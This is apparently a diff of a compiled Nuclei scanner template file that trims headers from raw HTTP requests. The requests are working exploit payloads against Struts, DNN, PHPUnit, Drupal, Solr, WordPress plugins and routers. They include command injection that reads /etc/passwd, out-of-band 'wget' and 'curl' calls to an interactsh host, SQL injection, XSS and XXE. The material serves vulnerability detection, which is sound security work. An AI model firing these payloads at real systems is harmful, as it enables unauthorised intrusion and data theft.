-            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1\nAccept-Language: en\nContent-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hacker','Bounty Plz')}.multipart/form-data\nConnection: Keep-Alive\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\nPragma: no-cache\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\n"
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1\nContent-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hacker','Bounty Plz')}.multipart/form-data\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\n"
           ]
         }
       ]
@@ -9044,7 +9155,7 @@
             }
           ],
           "raw": [
-            "GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: en-US,en;q=0.9\n"
+            "GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n"
           ]
         }
       ]
@@ -9173,7 +9284,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /__ HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\nAccept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: close\nCookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key=\"name1: key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">C:\\Windows\\win.ini</anyType></MethodParameters><ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>\n"
+            "GET /__ HTTP/1.1\nHost: {{Hostname}}\nAccept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nCookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key=\"name1: key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">C:\\Windows\\win.ini</anyType></MethodParameters><ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>\n"
           ]
         }
       ]
@@ -9212,12 +9323,12 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n",
-            "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n",
-            "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n",
-            "GET /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n",
-            "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n",
-            "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n"
+            "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/html\n\n<?php echo md5(phpunit_rce);?>\n",
+            "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/html\n\n<?php echo md5(phpunit_rce);?>\n",
+            "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/html\n\n<?php echo md5(phpunit_rce);?>\n",
+            "GET /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/html\n\n<?php echo md5(phpunit_rce);?>\n",
+            "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/html\n\n<?php echo md5(phpunit_rce);?>\n",
+            "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/html\n\n<?php echo md5(phpunit_rce);?>\n"
           ]
         }
       ]
@@ -9329,7 +9440,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /jolokia/read/getDiagnosticOptions HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 167\n\n{\n    \"type\" : \"read\",\n    \"mbean\" : \"java.lang:type=Memory\",\n    \"target\" : {\n         \"url\" : \"service:jmx:rmi:///jndi/ldap://127.0.0.1:1389/o=tomcat\"\n    }\n}\n"
+            "POST /jolokia/read/getDiagnosticOptions HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.\nContent-Type: application/x-www-form-urlencoded\n\n{\n   \"type\":\"read\",\n   \"mbean\":\"java.lang:type=Memory\",\n   \"target\":{\n      \"url\":\"service:jmx:rmi:///jndi/ldap://127.0.0.1:1389/o=tomcat\"\n   }\n}\n"
           ]
         }
       ]
@@ -9369,7 +9480,7 @@
           ],
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\n",
-            "POST /{{path}}/tree/a/search HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nContent-Length: 45\nContent-Type: application/x-www-form-urlencoded\n\nquery=--open-files-in-pager=cat%20/etc/passwd\n"
+            "POST /{{path}}/tree/a/search HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nquery=--open-files-in-pager=cat%20/etc/passwd\n"
           ]
         }
       ]
@@ -9493,9 +9604,6 @@
       },
       "requests": [
         {
-          "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"
-          },
           "matchers": [
             {
               "part": "body",
@@ -9558,8 +9666,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /system/sharedir.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: curl/7.58.0\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\n&uid=10; wget http://{{interactsh-url}}\n",
-            "POST /en/php/usb_sync.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: curl/7.58.0\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\n&act=sync&task_number=1;wget http://{{interactsh-url}}\n"
+            "POST /system/sharedir.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n&uid=10; wget http://{{interactsh-url}}\n",
+            "POST /en/php/usb_sync.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n&act=sync&task_number=1;wget http://{{interactsh-url}}\n"
           ]
         }
       ]
@@ -10497,7 +10605,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /upload HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.18.4\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\n\nlogtype=XML&timezone=1%3Bwget+http%3A%2F%2F{{interactsh-url}}%3B\n"
+            "POST /upload HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlogtype=XML&timezone=1%3Bwget+http%3A%2F%2F{{interactsh-url}}%3B\n"
           ]
         }
       ]
@@ -10786,7 +10894,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\n"
+            "GET /fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -10897,7 +11005,7 @@
             }
           ],
           "raw": [
-            "GET /plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=\"%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),0x6e75636c65692d74656d706c617465),NULL,NULL,NULL,NULL,NULL--%20aa HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\nReferer: {{BaseURL}}\n"
+            "GET /plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=\"%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),0x6e75636c65692d74656d706c617465),NULL,NULL,NULL,NULL,NULL--%20aa HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\n"
           ]
         }
       ]
@@ -11072,7 +11180,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /etc/passwd HTTP/1.1\nHost:\nContent-Length: 4\n\n"
+            "GET /etc/passwd HTTP/1.1\nHost:\n\n"
           ],
           "unsafe": true
         }
@@ -11660,8 +11768,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /assets/file:%2f%2f/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nContent-Length: 94\n",
-            "GET /assets/file:%2f%2f{{path}}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\n"
+            "GET /assets/file:%2f%2f/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /assets/file:%2f%2f{{path}}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -12043,7 +12151,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nHost:  {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/json\nReferer:  {{Hostname}}/user/register\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663\nContent-Length: 626\nConnection: close\n\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#post_render][]\"\n\npassthru\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#type]\"\n\nmarkup\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#markup]\"\n\ncat /etc/passwd\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"form_id\"\n\nuser_register_form\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"_drupal_ajax\"\n"
+            "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nHost:  {{Hostname}}\nAccept: application/json\nReferer:  {{Hostname}}/user/register\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663\n\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#post_render][]\"\n\npassthru\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#type]\"\n\nmarkup\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#markup]\"\n\ncat /etc/passwd\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"form_id\"\n\nuser_register_form\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"_drupal_ajax\"\n"
           ]
         }
       ]
@@ -12181,7 +12289,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nAuthorization: Digest username=admin\n"
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Digest username=admin\n"
           ]
         }
       ]
@@ -12580,7 +12688,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /timesheet/login.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 91\nDNT: 1\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\n\nusername=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login\n"
+            "POST /timesheet/login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login\n"
           ]
         }
       ]
@@ -12851,8 +12959,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /wp-admin/options-general.php?page=yuzo-related-post HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/x-www-form-urlencoded\n\nyuzo_related_post_css_and_style=</style><script>alert(0);</script>\n",
-            "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nUpgrade-Insecure-Requests: 1\n"
+            "POST /wp-admin/options-general.php?page=yuzo-related-post HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nyuzo_related_post_css_and_style=</style><script>alert(0);</script>\n",
+            "GET / HTTP/1.1\nHost: {{Hostname}}\n"
           ],
           "req-condition": true
         }
@@ -13139,7 +13247,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /wan.htm HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n"
+            "GET /wan.htm HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n"
           ]
         }
       ]
@@ -13498,7 +13606,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /password_change.cgi HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: https://{{Hostname}}/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 73\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nuser=rootxx&pam=&old=test|cat /etc/passwd&new1=test2&new2=test2&expired=2\n"
+            "POST /password_change.cgi HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nReferer: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\nuser=rootxx&pam=&old=test|cat /etc/passwd&new1=test2&new2=test2&expired=2\n"
           ]
         }
       ]
@@ -13798,7 +13906,7 @@
             }
           ],
           "raw": [
-            "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nContent-Length: 1\nConnection: close\n\necho\necho\ncat /etc/passwd 2>&1\n"
+            "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1\nHost: {{Hostname}}\n\necho\necho\ncat /etc/passwd 2>&1\n"
           ]
         }
       ]
@@ -14073,9 +14181,9 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nReferer: http://{{Hostname}}/\nUpgrade-Insecure-Requests: 1\n\nhtml_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384\n",
-            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nReferer: http://{{Hostname}}/login_pic.asp\nCookie: uid=1234123\nUpgrade-Insecure-Requests: 1\n\nhtml_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('cat /etc/passwd')}}\n",
-            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nReferer: http://{{Hostname}}/login_pic.asp\nCookie: uid=1234123\nUpgrade-Insecure-Requests: 1\n\nhtml_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('type C:\\\\Windows\\\\win.ini')}}\n"
+            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}\n\nhtml_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384\n",
+            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/login_pic.asp\nCookie: uid=1234123\n\nhtml_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('cat /etc/passwd')}}\n",
+            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/login_pic.asp\nCookie: uid=1234123\n\nhtml_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('type C:\\\\Windows\\\\win.ini')}}\n"
           ]
         }
       ]
@@ -14150,7 +14258,7 @@
             "ids": "helpers/wordlists/numbers.txt"
           },
           "raw": [
-            "GET /zabbix.php?action=dashboard.view&dashboardid={{ids}} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0\nAccept-Language: en-US,en;q=0.9\n"
+            "GET /zabbix.php?action=dashboard.view&dashboardid={{ids}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en-US,en;q=0.9\n"
           ],
           "stop-at-first-match": true,
           "threads": 50
@@ -14311,8 +14419,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n",
-            "POST /solr/{{core}}/config HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nContent-Length: 259\n\n{\n    \"update-queryresponsewriter\": {\n      \"startup\": \"lazy\",\n      \"name\": \"velocity\",\n      \"class\": \"solr.VelocityResponseWriter\",\n      \"template.base.dir\": \"\",\n      \"solr.resource.loader.enabled\": \"true\",\n      \"params.resource.loader.enabled\": \"true\"\n    }\n}\n",
+            "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /solr/{{core}}/config HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n    \"update-queryresponsewriter\": {\n      \"startup\": \"lazy\",\n      \"name\": \"velocity\",\n      \"class\": \"solr.VelocityResponseWriter\",\n      \"template.base.dir\": \"\",\n      \"solr.resource.loader.enabled\": \"true\",\n      \"params.resource.loader.enabled\": \"true\"\n    }\n}\n",
             "GET /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20http://{{interactsh-url}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n"
           ]
         }
@@ -14760,7 +14868,7 @@
             }
           ],
           "raw": [
-            "POST /xmlpserver/ReportTemplateService.xls HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Length: 76\nContent-Type: text/xml; charset=UTF-8\n\n<!DOCTYPE soap:envelope PUBLIC \"-//B/A/EN\" \"http://{{interactsh-url}}\">\n"
+            "POST /xmlpserver/ReportTemplateService.xls HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Type: text/xml; charset=UTF-8\n\n<!DOCTYPE soap:envelope PUBLIC \"-//B/A/EN\" \"http://{{interactsh-url}}\">\n"
           ]
         }
       ]
@@ -14873,7 +14981,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /rest/tinymce/1/macro/preview HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nReferer: {{Hostname}}\nContent-Length: 168\nConnection: close\n\n{\"contentId\":\"786457\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc5\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}}}\n"
+            "POST /rest/tinymce/1/macro/preview HTTP/1.1\nHost: {{Hostname}}\nReferer: {{Hostname}}\n\n{\"contentId\":\"786457\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc5\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}}}\n"
           ]
         }
       ]
@@ -15220,7 +15328,7 @@
             }
           ],
           "raw": [
-            "PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36\nContent-Length: 124\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\n{\"Type\":\"SubscriptionConfirmation\",\"Message\":\"\",\"SubscribeURL\":\"https://rfi.nessus.org/rfi.txt\"}\n"
+            "PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n{\"Type\":\"SubscriptionConfirmation\",\"Message\":\"\",\"SubscribeURL\":\"https://rfi.nessus.org/rfi.txt\"}\n"
           ]
         }
       ]
@@ -15371,8 +15479,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n",
-            "GET /nuclei.txt HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n"
